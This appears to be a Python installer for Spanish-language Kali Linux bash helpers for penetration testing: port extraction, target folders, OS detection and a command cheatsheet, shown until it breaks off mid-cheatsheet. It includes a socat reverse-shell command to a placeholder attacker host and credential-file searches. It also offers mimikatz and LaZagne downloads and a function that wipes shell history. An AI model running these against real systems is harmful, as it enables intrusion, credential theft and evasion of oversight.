#!/usr/bin/env python3
import os
import sys
import subprocess
import pwd

# ==========================================
# CONFIGURACIÓN DE DEPENDENCIAS
# ==========================================
SYSTEM_PACKAGES = [
    "xclip",
    "python3-venv",
    "jq",
    "bat"
]

PIP_PACKAGES = [
    "requests",
    "colorama"
]

# ==========================================
# CÓDIGO DE LAS HERRAMIENTAS (BASH)
# ==========================================
TOOLS = {
    "01_keyboard_utils.sh": r'''# Configuración de Teclado
set_latam() { setxkbmap latam 2>/dev/null && echo -e "\e[1;32m[+] Teclado: LATAM\e[0m"; }
set_es() { setxkbmap es 2>/dev/null && echo -e "\e[1;32m[+] Teclado: ES\e[0m"; }
set_us() { setxkbmap us 2>/dev/null && echo -e "\e[1;32m[+] Teclado: US\e[0m"; }

kali_update() {
    sudo apt update && sudo apt dist-upgrade -y && sudo apt autoremove -y && sudo apt autoclean -y
    echo -e "\e[1;32m[+] Sistema actualizado. Reiniciando en 5s...\e[0m"
    sleep 5 && sudo reboot
}
''',

    "02_utils.sh": r'''# ──────────────────────────────────────────────────────────────
# UTILIDADES ESTILO S4VITAR (Flujo de trabajo ágil)
# ──────────────────────────────────────────────────────────────

# 1. extractPorts (El clásico de S4vitar)
# Extrae los puertos de un archivo grepable de Nmap (.gnmap) y los copia al portapapeles.
extractPorts() {
    if [[ -z "$1" ]]; then
        echo -e "${RED}[!] Uso: extractPorts <archivo.gnmap>${NC}"
        return 1
    fi

    # Se requiere xclip instalado (sudo apt install xclip)
    if ! command -v xclip &> /dev/null; then
        echo -e "${YELLOW}[!] Necesitas instalar xclip: sudo apt install xclip${NC}"
        return 1
    fi

    local ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
    local ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)"

    echo -e "${CYAN}\n[*] Extracting information...\n${NC}"
    echo -e "  ${YELLOW}► IP Address:${NC} $ip_address"
    echo -e "  ${YELLOW}► Open ports:${NC} $ports\n"

    echo $ports | tr -d '\n' | xclip -sel clip
    echo -e "${GREEN}[*] Ports copied to clipboard\n${NC}"
}

# 2. mkt (Make Target)
# Crea la estructura de carpetas típica que S4vitar usa para cada máquina.
mkt() {
    if [[ -z "$1" ]]; then
        # Si no le pasas argumento, crea las carpetas en el directorio actual
        mkdir {nmap,content,exploits,scripts} 2>/dev/null
        echo -e "${GREEN}[+] Estructura creada en el directorio actual.${NC}"
    else
        # Si le pasas el nombre de la máquina, crea la carpeta base y entra
        mkdir -p "$1"/{nmap,content,exploits,scripts}
        cd "$1" || return
        echo -e "${GREEN}[+] Target '$1' creado. Estructura lista.${NC}"
    fi
}

# 3. rmk (Remove Target)
# Borra el directorio actual si te equivocaste (usar con cuidado)
rmk() {
    local target_dir=$(pwd)
    echo -e "${RED}[!] ¿Estás seguro de que quieres borrar el directorio actual ($target_dir)? (y/n)${NC}"
    read -r response
    if [[ "$response" == "y" ]]; then
        cd ..
        rm -rf "$target_dir"
        echo -e "${GREEN}[+] Directorio eliminado.${NC}"
    else
        echo -e "${YELLOW}[*] Operación cancelada.${NC}"
    fi
}

# 4. OS Detection por TTL (El famoso whichSystem)
# Hace un ping a la máquina y te dice el sistema operativo basándose en el TTL.
whichSystem() {
    if [[ -z "$1" ]]; then
        echo -e "${RED}[!] Uso: whichSystem <ip>${NC}"
        return 1
    fi

    local ttl=$(ping -c 1 "$1" 2>/dev/null | grep -oP 'ttl=\d+' | cut -d= -f2)

    if [[ -z "$ttl" ]]; then
        echo -e "${RED}[!] No hay respuesta ICMP (Host caído o Ping bloqueado).${NC}"
        return 1
    fi

    if [[ "$ttl" -le 64 ]]; then
        echo -e "${GREEN}[+] IP: $1 -> Sistema: Linux (TTL $ttl)${NC}"
    elif [[ "$ttl" -le 128 ]]; then
        echo -e "${BLUE}[+] IP: $1 -> Sistema: Windows (TTL $ttl)${NC}"
    else
        echo -e "${YELLOW}[+] IP: $1 -> Sistema: Solaris/AIX o desconocido (TTL $ttl)${NC}"
    fi
}

# =========================================================
# LIMPIEZA DE HISTORIAL Y MODO INCÓGNITO (Amnesia Total)
# =========================================================
hclear() {
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║  👻 INICIANDO MODO INCÓGNITO (AMNESIA DE SESIÓN)             ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}\n"

    echo -e "${YELLOW}[*] Destruyendo archivos físicos de historial...${NC}"
    # Borramos historiales de Bash, Zsh y de herramientas comunes
    rm -f ~/.bash_history ~/.zsh_history ~/.python_history ~/.mysql_history ~/.wget-hsts ~/.lesshst 2>/dev/null

    echo -e "${YELLOW}[*] Limpiando memoria RAM de la shell actual...${NC}"
    # Limpiamos el historial en memoria dependiendo de si usas Zsh o Bash
    if [[ -n "$ZSH_VERSION" ]]; then
        # En Zsh a veces history -c no basta, fc -p limpia la pila
        fc -p 2>/dev/null
    elif [[ -n "$BASH_VERSION" ]]; then
        history -c 2>/dev/null
    fi

    echo -e "${YELLOW}[*] Desactivando variables de registro...${NC}"
    # Desactivamos el archivo de destino
    unset HISTFILE
    # Ponemos el límite de guardado a cero (por si acaso)
    export HISTSIZE=0
    export HISTFILESIZE=0
    export SAVEHIST=0

    echo -e "${GREEN}[+] ¡Listo! El historial ha sido erradicado.${NC}"
    echo -e "${GREEN}[+] Todo lo que escribas a partir de ahora NO se guardará.${NC}"
    sleep 2
    clear
}

# Función para crear y activar un entorno virtual e instalar requirements
mkvenv() {
    # Usa ".venv" por defecto, o el nombre que le pases como argumento
    local venv_name="${1:-.venv}"

    echo "🐍 Creando entorno virtual: '$venv_name'..."
    python3 -m venv "$venv_name"

    # Verificar si el entorno se creó correctamente
    if [ $? -ne 0 ]; then
        echo "❌ Error al crear el entorno virtual. Asegúrate de tener instalado 'python3-venv'."
        return 1
    fi

    echo "🔄 Activando el entorno virtual..."
    source "$venv_name/bin/activate"

    echo "📦 Actualizando pip..."
    pip install --upgrade pip

    # Instalar dependencias si existe el archivo requirements.txt
    if [ -f "requirements.txt" ]; then
        echo "📄 requirements.txt detectado. Instalando dependencias..."
        pip install -r requirements.txt
    else
        echo "ℹ️ No se encontró requirements.txt en este directorio."
    fi

    echo "✅ ¡Listo! Entorno '$venv_name' activado."
}
''',

    "03_s4vitar.sh": r'''# S4V-06: Tratamiento de TTY (como s4vitar)
tty_treatment() {
    clear
    echo -e "${BOLD}${YELLOW}╔════════════════════════════════════════════════╗${NC}"
    echo -e "${BOLD}${YELLOW}║  🖥️  S4VITAR-STYLE: TRATAMIENTO DE TTY         ║${NC}"
    echo -e "${BOLD}${YELLOW}╚════════════════════════════════════════════════╝${NC}"

    echo -e "\n${BOLD}${GREEN}═══ TRATAMIENTO DE TTY (S4vitar Style) ═══${NC}\n"
    echo -e "  ${CYAN}Paso 1:${NC} script /dev/null -c bash"
    echo -e "  ${CYAN}Paso 2:${NC} Ctrl+Z (background)"
    echo -e "  ${CYAN}Paso 3:${NC} stty raw -echo; fg"
    echo -e "  ${CYAN}Paso 4:${NC} reset xterm"
    echo -e "  ${CYAN}Paso 5:${NC} export TERM=xterm"
    echo -e "  ${CYAN}Paso 6:${NC} export SHELL=bash"
    echo -e "  ${CYAN}Paso 7:${NC} stty rows 42 columns 168"

    echo -e "\n${BOLD}${YELLOW}Alternativa con Python:${NC}"
    echo -e "  python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
    echo -e "  export TERM=xterm"
    echo -e "  Ctrl+Z -> stty raw -echo; fg -> reset xterm"

    echo -e "\n${BOLD}${YELLOW}Alternativa con Socat:${NC}"
    echo -e "  # En la máquina atacante:"
    echo -e "  socat file:\$(tty),raw,echo=0 tcp-listen:4444"
    echo -e "  # En la máquina víctima (Reemplaza LHOST):"
    echo -e "  socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST>:4444"

    echo -e "\n${BOLD}${YELLOW}Ver dimensiones actuales:${NC}"
    echo -e "  stty size"

    echo -e "\n${BOLD}${YELLOW}Configurar stty personalizado:${NC}"
    echo -ne "  ${CYAN}[?] Filas [42]: ${NC}"
    read -r rows
    echo -ne "  ${CYAN}[?] Columnas [168]: ${NC}"
    read -r cols

    rows=${rows:-42}; cols=${cols:-168}
    echo -e "  ${GREEN}Comando resultante:${NC} stty rows ${rows} columns ${cols}"
}

# S4V-07: Escalada de privilegios automatizada
privesc() {
    clear
    echo -e "${BOLD}${YELLOW}╔════════════════════════════════════════════════╗${NC}"
    echo -e "${BOLD}${YELLOW}║  ⬆️  S4VITAR-STYLE: PRIVESC CHECK              ║${NC}"
    echo -e "${BOLD}${YELLOW}╚════════════════════════════════════════════════╝${NC}"

    echo -e "\n${BOLD}${GREEN}═══ LINUX PRIVESC ═══${NC}"
    echo -e "  ${CYAN}Kernel:${NC}" 
    echo -e "    uname -a"
    echo -e "    cat /etc/os-release"
    echo -e "  ${CYAN}SUID Binaries:${NC}"
    echo -e "    find / -perm -4000 -type f 2>/dev/null"
    echo -e "  ${CYAN}Capabilities:${NC}"
    echo -e "    getcap -r / 2>/dev/null"
    echo -e "  ${CYAN}Sudo:${NC}"
    echo -e "    sudo -l"
    echo -e "  ${CYAN}Crontab:${NC}"
    echo -e "    cat /etc/crontab"
    echo -e "    ls -la /etc/cron*"
    echo -e "  ${CYAN}Writable Files:${NC}"
    echo -e "    find / -writable -type f 2>/dev/null | grep -v proc"
    echo -e "  ${CYAN}Processes:${NC}"
    echo -e "    ps aux | grep -v '\['"
    echo -e "  ${CYAN}Network:${NC}"
    echo -e "    ss -tlnp"
    echo -e "  ${CYAN}Historial:${NC}"
    echo -e "    cat ~/.bash_history 2>/dev/null | tail -50"
    echo -e "    cat ~/.mysql_history 2>/dev/null"
    echo -e "  ${CYAN}Keys y credenciales:${NC}"
    echo -e "    find / -name 'id_rsa' -o -name '*.kdbx' -o -name '*.ovpn' 2>/dev/null"
    echo -e "    grep -ri 'password' /home/ 2>/dev/null"

    echo -e "\n${BOLD}${GREEN}═══ WINDOWS PRIVESC ═══${NC}"
    echo -e "  ${CYAN}System info:${NC}"
    echo -e "    systeminfo"
    echo -e "  ${CYAN}Whoami:${NC}"
    echo -e "    whoami /all"
    echo -e "  ${CYAN}Users & Groups:${NC}"
    echo -e "    net users"
    echo -e "    net localgroup Administrators"
    echo -e "  ${CYAN}Services:${NC}"
    echo -e "    wmic service get name,displayname,pathname,startmode | findstr /i 'auto'"
    echo -e "  ${CYAN}Patch level:${NC}"
    echo -e "    wmic qfe get Caption,Description,HotFixID,InstalledOn"
    echo -e "  ${CYAN}AlwaysInstallElevated:${NC}"
    echo -e "    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated"
    echo -e "    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated"
    echo -e "  ${CYAN}Unquoted Service Paths:${NC}"
    echo -e "    wmic service get name,displayname,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\"\"\""
    echo -e "  ${CYAN}Modifiable Services:${NC}"
    echo -e "    sc query | findstr /i SERVICE_NAME"
    echo -e "  ${CYAN}Token Privileges:${NC}"
    echo -e "    whoami /priv | findstr \"SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege SeDebugPrivilege\""

    echo -e "\n${BOLD}${GREEN}═══ HERRAMIENTAS RECOMENDADAS ═══${NC}"
    echo -e "  ${CYAN}Linux:${NC}"
    echo -e "    wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
    echo -e "    wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64"
    echo -e "  ${CYAN}Windows:${NC}"
    echo -e "    wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe"
    echo -e "    wget https://github.com/ParrotSec/mimikatz/raw/master/x64/mimikatz.exe"
    echo -e "    wget https://github.com/AlessandroZ/LaZagne/releases/latest/download/lazagne.exe"
}
''',

    "04_kali_cheatsheet.sh": r'''# ============================================================
# CHEATSHEET INTERACTIVO PARA KALI LINUX
# ============================================================
# Función: cheatsheet
# Uso: cheatsheet [comando|directorio|categoria]
# ============================================================

cheatsheet() {
    local search="$1"
    local color_header="\033[1;36m"    # Cyan bold
    local color_cmd="\033[1;33m"       # Yellow bold
    local color_desc="\033[0;37m"      # White
    local color_sep="\033[1;30m"       # Dark gray
    local color_reset="\033[0m"

    case "$search" in
        "")
            # Mostrar menú principal
            echo -e "${color_header}╔══════════════════════════════════════════════════╗${color_reset}"
            echo -e "${color_header}║        🐉  KALI LINUX CHEATSHEET  🐉             ║${color_reset}"
            echo -e "${color_header}╠══════════════════════════════════════════════════╣${color_reset}"
            echo -e "${color_header}║${color_reset}  Usa: ${color_cmd}cheatsheet <categoria>${color_reset}"
            echo -e "${color_header}║${color_reset}                                                  "
            echo -e "${color_header}║${color_reset}  ${color_cmd}Categorías disponibles:${color_reset}"
            echo -e "${color_header}║${color_reset}    ${color_cmd}basicos${color_reset}     - Comandos básicos de Linux"
            echo -e "${color_header}║${color_reset}    ${color_cmd}directorios${color_reset} - Estructura del sistema de archivos"
            echo -e "${color_header}║${color_reset}    ${color_cmd}red${color_reset}         - Comandos de red y conectividad"
            echo -e "${color_header}║${color_reset}    ${color_cmd}permisos${color_reset}    - Gestión de permisos y propietarios"
            echo -e "${color_header}║${color_reset}    ${color_cmd}usuarios${color_reset}    - Administración de usuarios"
            echo -e "${color_header}║${color_reset}    ${color_cmd}procesos${color_reset}    - Monitoreo y gestión de procesos"
            echo -e "${color_header}║${color_reset}    ${color_cmd}paquetes${color_reset}    - Gestión de paquetes (apt)"
            echo -e "${color_header}║${color_reset}    ${color_cmd}compresion${color_reset}  - Compresión y archivado"
            echo -e "${color_header}║${color_reset}    ${color_cmd}busqueda${color_reset}    - Búsqueda de archivos y contenido"
            echo -e "${color_header}║${color_reset}    ${color_cmd}disco${color_reset}       - Análisis de espacio y particiones"
            echo -e "${color_header}║${color_reset}    ${color_cmd}todo${color_reset}        - Mostrar todo el cheatsheet"
            echo -e "${color_header}║${color_reset}                                                  "
            echo -e "${color_header}║${color_reset}  También puedes buscar: ${color_cmd}cheatsheet ls${color_reset}"
            echo -e "${color_header}║${color_reset}  ${color_cmd}cheatsheet /etc${color_reset}   ${color_desc}(busca en descripciones)${color_reset}"
            echo -e "${color_header}╚══════════════════════════════════════════════════╝${color_reset}"
            ;;

        "basicos"|"basico"|"básicos"|"básico")
            echo -e "${color_header}╔══════════════════════════════════════════════════╗${color_reset}"
            echo -e "${color_header}║            📋  COMANDOS BÁSICOS                  ║${color_reset}"
            echo -e "${color_header}╠══════════════════════════════════════════════════╣${color_reset}"
            printf "${color_cmd}%-25s ${color_desc}%s${color_reset}\n" "ls" "Listar archivos y directorios"
            printf "${color_cmd}%-25s ${color_desc}%s${color_reset}\n" "ls -la" "Listar todo con detalles (incluye ocultos)"
            printf "${color_cmd}%-25s ${color_desc}%s${color_reset}\n" "pwd" "Mostrar el directorio de trabajo actual"
            printf "${color_cmd}%-25s ${color_desc}%s${color_reset}\n" "cd <dir>" "Cambiar de directorio"
            printf "${color_cmd}%-25s ${color_desc}%s${color_reset}\n" "cd .." "Ir al directorio anterior"
            printf "${color_cmd}%-25s ${color_desc}%s${color_reset}\n" "cd ~" "Ir al directorio home"
            printf "${color_cmd}%-25s ${color_desc}%s${color_reset}\n" "cd -" "Ir al último directorio visitado"
            printf "${color_cmd}%-25s ${color_desc}%s${color_reset}\n" "mkdir <dir>" "Crear un nuevo directorio"
            printf "${color_cmd}%-25s ${color_desc}%s${color_reset}\n" "mkdir -p <ruta>" "Crear directorios anidados"
            printf "${color_cmd}%-25s ${color_desc}%s${color_reset}\n" "touch <arch>" "Crear un archivo vacío"
            printf "${color_cmd}%-25s ${color_desc}%s${color_reset}\n" "cp <orig> <dest>" "Copiar archivos o directorios"
            printf "${color_cmd}%-25s ${color_desc}%s${color_reset}\n" "cp -r <orig> <dest>" "Copiar directorios recursivamente"
            printf "${color_cmd}%-25s ${color_desc}%s${color_reset}\n" "mv <orig> <dest>" "Mover o renombrar archivos/directorios"
            printf "${color_cmd}%-25s ${color_desc}%s${color_reset}\n" "rm <arch>" "Eliminar archivos"
            printf "${color_cmd}%-25s ${color_desc}%s${color_reset}\n" "rm -rf <dir>" "Eliminar directorio y su contenido (¡CUIDADO!)"
            printf "${color_cmd}%-25s ${color_desc}%s${color_reset}\n" "cat <arch>" "Mostrar contenido de un archivo"
            printf "${color_cmd}%-25s ${color_desc}%s${color_reset}\n" "cat /etc/passwd" "Mostrar todos los usuarios del sistema"
            printf "${color_cmd}%-25s ${color_desc}%s${color_reset}\n" "cut -d: -f1 /etc/passwd" "Extraer solo nombres de usuario"
            printf "${color_cmd}%-25s ${color_desc}%s${color_reset}\n" "awk -F: '\$3>=1000 {print\$1}' /etc/passwd" "Mostrar solo usuarios humanos"
            printf "${color_cmd}%-25s ${color_desc}%s${color_reset}\n" "getent passwd" "Info sobre usuarios y servicios"
            printf "${color_cmd}%-25s ${color_desc}%s${color_reset}\n" "less <arch>" "Ver contenido paginado"
            printf "${color_cmd}%-25s ${color_desc}%s${color_reset}\n" "head <arch>" "Mostrar primeras líneas (10 por defecto)"
            printf "${color_cmd}%-25s ${color_desc}%s${color_reset}\n" "tail <arch>" "Mostrar últimas líneas"
            printf "${color_cmd}%-25s ${color_desc}%s${color_reset}\n" "tail -f <arch>" "Seguir logs en tiempo real"
            printf "${color_cmd}%-25s ${color_desc}%s${color_reset}\n" "file <arch>" "Ver el tipo de un documento"
            echo -e "${color_header}╚══════════════════════════════════════════════════╝${color_reset}"
            ;;
        "directorios"|"directorio"|"estructura"|"filesystem")
            echo -e "${color_header}╔══════════════════════════════════════════════════╗${color_reset}"
            echo -e "${color_header}║        📂  ESTRUCTURA DE DIRECTORIOS             ║${color_reset}"
            echo -e "${color_header}╠══════════════════════════════════════════════════╣${color_reset}"
            printf "${color_cmd}%-12s ${color_desc}%s${color_reset}\n" "/" "Directorio raíz del sistema"
            printf "${color_cmd}%-12s ${color_desc}%s${color_reset}\n" "/bin" "Binarios esenciales (ls, cp, mv, cat...)"
            printf "${color_cmd}%-12s ${color_desc}%s${color_reset}\n" "/boot" "Archivos de arranque (kernel, initrd)"
            printf "${color_cmd}%-12s ${color_desc}%s${color_reset}\n" "/dev" "Archivos de dispositivos de hardware"
            printf "${color_cmd}%-12s ${color_desc}%s${color_reset}\n" "/etc" "Configuración del sistema y servicios"
            printf "${color_cmd}%-12s ${color_desc}%s${color_reset}\n" "/home" "Archivos personales de los usuarios"
            printf "${color_cmd}%-12s ${color_desc}%s${color_reset}\n" "/lib" "Bibliotecas compartidas del sistema"
            printf "${color_cmd}%-12s ${color_desc}%s${color_reset}\n" "/media" "Montaje de dispositivos extraíbles"
            printf "${color_cmd}%-12s ${color_desc}%s${color_reset}\n" "/mnt" "Montaje manual de sistemas de archivos"
            printf "${color_cmd}%-12s ${color_desc}%s${color_reset}\n" "/opt" "Software adicional no estándar"
            printf "${color_cmd}%-12s ${color_desc}%s${color_reset}\n" "/proc" "Sistema virtual de procesos del kernel"
            printf "${color_cmd}%-12s ${color_desc}%s${color_reset}\n" "/root" "Home del usuario root"
            printf "${color_cmd}%-12s ${color_desc}%s${color_reset}\n" "/run" "Datos volátiles de servicios en ejecución"
            printf "${color_cmd}%-12s ${color_desc}%s${color_reset}\n" "/sbin" "Binarios de administración (root)"
            printf "${color_cmd}%-12s ${color_desc}%s${color_reset}\n" "/srv" "Datos de servicios (web, FTP...)"
            printf "${color_cmd}%-12s ${color_desc}%s${color_reset}\n" "/sys" "Información y control del hardware"
            printf "${color_cmd}%-12s ${color_desc}%s${color_reset}\n" "/tmp" "Archivos temporales (se borran al reiniciar)"
            printf "${color_cmd}%-12s ${color_desc}%s${color_reset}\n" "/usr" "Aplicaciones, librerías y docs de usuario"
            printf "${color_cmd}%-12s ${color_desc}%s${color_reset}\n" "/var" "Datos variables (logs, bases de datos...)"
            echo -e "${color_header}╚══════════════════════════════════════════════════╝${color_reset}"
            ;;
        "red"|"network"|"networking")
            echo -e "${color_header}╔══════════════════════════════════════════════════╗${color_reset}"
            echo -e "${color_header}║        🌐  COMANDOS DE RED                       ║${color_reset}"
            echo -e "${color_header}╠══════════════════════════════════════════════════╣${color_reset}"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "ip a" "Mostrar interfaces de red y direcciones IP"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "ip route" "Mostrar tabla de enrutamiento"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "ifconfig" "Configurar/mostrar interfaces (legacy)"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "ping <host>" "Probar conectividad con un host"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "traceroute <host>" "Rastrear ruta hasta un host"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "netstat -tulpn" "Puertos en escucha y conexiones"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "ss -tulpn" "Socket stats (moderno, reemplaza netstat)"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "nmap <target>" "Escaneo de puertos (Kali staple)"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "wget <url>" "Descargar archivos desde la web"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "curl <url>" "Transferir datos desde/hacia servidores"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "ssh user@host" "Conexión remota SSH"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "scp <arch> user@host:<ruta>" "Copiar archivos por SSH"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "rsync -av <orig> <dest>" "Sincronizar archivos remotos/local"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "nc -lvnp <puerto>" "Netcat - escuchar en puerto"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "nc -vn <host> <puerto>" "Netcat - conectar a puerto"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "dig <dominio>" "Consultas DNS detalladas"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "nslookup <dominio>" "Consultas DNS simples"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "host <dominio>" "Resolver nombre a IP"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "whois <dominio>" "Información de registro de dominio"
            echo -e "${color_header}╚══════════════════════════════════════════════════╝${color_reset}"
            ;;
        "permisos"|"permiso"|"permissions"|"chmod"|"chown")
            echo -e "${color_header}╔══════════════════════════════════════════════════╗${color_reset}"
            echo -e "${color_header}║        🔐  PERMISOS Y PROPIEDADES               ║${color_reset}"
            echo -e "${color_header}╠══════════════════════════════════════════════════╣${color_reset}"
            printf "${color_cmd}%-35s ${color_desc}%s${color_reset}\n" "chmod 755 <arch>" "rwxr-xr-x (dueño=todo, grupo/otros=lectura+ejec)"
            printf "${color_cmd}%-35s ${color_desc}%s${color_reset}\n" "chmod 644 <arch>" "rw-r--r-- (dueño=lectura+escritura, resto=solo lectura)"
            printf "${color_cmd}%-35s ${color_desc}%s${color_reset}\n" "chmod 600 <arch>" "rw------- (solo dueño puede leer/escribir)"
            printf "${color_cmd}%-35s ${color_desc}%s${color_reset}\n" "chmod 777 <arch>" "rwxrwxrwx (todo el mundo - ¡INSEGURO!)"
            printf "${color_cmd}%-35s ${color_desc}%s${color_reset}\n" "chmod +x <arch>" "Añadir ejecución al archivo"
            printf "${color_cmd}%-35s ${color_desc}%s${color_reset}\n" "chmod -R 755 <dir>" "Cambiar permisos recursivamente"
            printf "${color_cmd}%-35s ${color_desc}%s${color_reset}\n" "chown user:group <arch>" "Cambiar dueño y grupo"
            printf "${color_cmd}%-35s ${color_desc}%s${color_reset}\n" "chown user <arch>" "Cambiar solo el dueño"
            printf "${color_cmd}%-35s ${color_desc}%s${color_reset}\n" "chgrp group <arch>" "Cambiar solo el grupo"
            printf "${color_cmd}%-35s ${color_desc}%s${color_reset}\n" "ls -l" "Ver permisos de archivos"
            printf "${color_cmd}%-35s ${color_desc}%s${color_reset}\n" "stat <arch>" "Ver permisos en detalle (octal+texto)"
            printf "${color_cmd}%-35s ${color_desc}%s${color_reset}\n" "umask" "Ver máscara de permisos por defecto"
            printf "${color_cmd}%-35s ${color_desc}%s${color_reset}\n" "getfacl <arch>" "Ver ACLs de un archivo"
            printf "${color_cmd}%-35s ${color_desc}%s${color_reset}\n" "setfacl -m u:user:rwx <arch>" "Asignar ACL a usuario"
            echo -e "${color_header}╚══════════════════════════════════════════════════╝${color_reset}"
            ;;
        "usuarios"|"usuario"|"users"|"user")
            echo -e "${color_header}╔══════════════════════════════════════════════════╗${color_reset}"
            echo -e "${color_header}║        👥  ADMINISTRACIÓN DE USUARIOS           ║${color_reset}"
            echo -e "${color_header}╠══════════════════════════════════════════════════╣${color_reset}"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "whoami" "Mostrar usuario actual"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "id" "Mostrar UID, GID y grupos del usuario"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "useradd <user>" "Agregar un nuevo usuario"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "userdel <user>" "Eliminar un usuario"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "userdel -r <user>" "Eliminar usuario y su home"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "usermod -aG <grupo> <user>" "Agregar usuario a grupo"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "passwd <user>" "Cambiar contraseña del usuario"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "groupadd <grupo>" "Crear un nuevo grupo"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "groups <user>" "Mostrar grupos del usuario"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "cat /etc/passwd" "Listar todos los usuarios"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "cat /etc/group" "Listar todos los grupos"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "cat /etc/shadow" "Ver hashes de contraseñas (root)"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "sudo -l" "Ver comandos sudo permitidos"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "su <user>" "Cambiar a otro usuario"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "sudo su -" "Cambiar a root"  
            echo -e "${color_header}╚══════════════════════════════════════════════════╝${color_reset}"
            ;;
        "procesos"|"proceso"|"process"|"ps"|"top")
            echo -e "${color_header}╔══════════════════════════════════════════════════╗${color_reset}"
            echo -e "${color_header}║        ⚙️  GESTIÓN DE PROCESOS                   ║${color_reset}"
            echo -e "${color_header}╠══════════════════════════════════════════════════╣${color_reset}"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "ps aux" "Listar todos los procesos"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "ps -ef" "Listar todos los procesos (formato estándar)"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "ps aux | grep <proceso>" "Buscar proceso específico"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "top" "Monitor interactivo de procesos"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "htop" "Monitor interactivo mejorado"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "kill <PID>" "Terminar proceso por ID"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "kill -9 <PID>" "Forzar terminación (SIGKILL)"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "kill -15 <PID>" "Terminación graceful (SIGTERM)"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "pkill <nombre>" "Matar proceso por nombre"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "killall <nombre>" "Matar todos los procesos con ese nombre"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "pgrep <nombre>" "Buscar PID por nombre"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "nice -n <val> <cmd>" "Ejecutar con prioridad específica"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "renice <val> -p <PID>" "Cambiar prioridad de proceso en ejecución"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "nohup <cmd> &" "Ejecutar proceso ignorando SIGHUP (fondo)"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "jobs" "Listar trabajos en segundo plano"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "fg %<n>" "Traer trabajo al primer plano"
            printf "${color_cmd}%-30s ${color_desc}%s${color_reset}\n" "bg %<n>" "Enviar trabajo al segundo plano"
            echo -e "${color_header}╚══════════════════════════════════════════════════╝${color_reset}"
            ;;
        "paquetes"|"paquete"|"apt"|"packages")
            echo -e "${color_header}╔══════════════════════════════════════════════════╗${color_reset}"
            echo -e "${color_header}║        📦  GESTIÓN DE PAQUETES (APT)             ║${color_reset}"
            echo -e "${color_header}╠══════════════════════════════════════════════════╣${color_reset}"
            printf "${color_cmd}%-40s ${color_desc}%s${color_reset}\n" "sudo apt update" "Actualizar lista de paquetes"
            printf "${color_cmd}%-40s ${color_desc}%s${color_reset}\n" "sudo apt upgrade" "Actualizar paquetes instalados"
